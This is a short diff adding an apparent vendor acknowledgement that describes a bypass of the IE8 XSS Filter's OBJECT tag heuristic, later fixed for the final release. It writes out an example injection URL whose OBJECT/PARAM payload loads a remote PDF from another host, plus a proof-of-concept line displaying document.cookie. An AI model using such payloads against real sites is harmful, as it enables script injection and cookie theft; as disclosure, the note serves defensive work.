@@ -1,0 +1,4 @@
+Credit goes to Alex "Kuza55" Kouzemtchenko for identifying a weakness in the XSS Filter OBJECT tag heuristic.  The original heuristic failed to properly sanitize OBJECT tags with the DATA attribute set.  Alex found that it is possible to use the DATA attribute to instantiate the PDF handler, then reference content to be loaded using a PARAM element.  This would load a remote PDF that would execute script in the context of the hosting page, effectively enabling XSS.
+Example: http://site.tld/foo.asp?FName=<object%20data=anything_at_all.pdf><param%20name=src%20value=http://othersite.tld/xss.pdf%20></param></object>
+The PDF proof-of-concept contained: getURL("vbscript:MsgBox document.cookie");
+Thanks to Alex, we were able to address this bug for the IE8 final release.
